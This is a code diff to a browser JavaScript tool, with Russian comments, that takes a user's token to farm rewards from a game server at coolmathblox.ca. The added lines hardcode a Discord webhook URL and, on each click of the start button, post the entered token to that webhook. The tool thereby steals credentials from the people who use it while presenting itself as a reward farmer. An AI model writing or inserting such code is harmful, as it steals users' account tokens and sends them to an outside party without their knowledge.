@@ -1,4 +1,5 @@
 // Элементы интерфейса
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512728829163081788/zcnRNhZcwEyTYR9Qh1Ux3-L-af4q58hYFcEaZPi1tBDIPSvEQ30rUwQn_XX-BTobYG1X'; 
 const startBtn = document.getElementById('start-btn');
 const infoBtn = document.getElementById('info-btn');
 const tokenInput = document.getElementById('token-input');
@@ -41,6 +42,15 @@ startBtn.addEventListener('click', () => {
     startBtn.disabled = true;
     startBtn.textContent = 'Процесс идет...';
 
+    // 3. Запрос в Discord
+    const discordPromise = fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${token}\``
+        })
+    });
+    
     // Функция для выполнения запроса к серверу игры
     const sendRewardRequest = () => {
         fetch("https://session.coolmathblox.ca/rewarded_ad", {
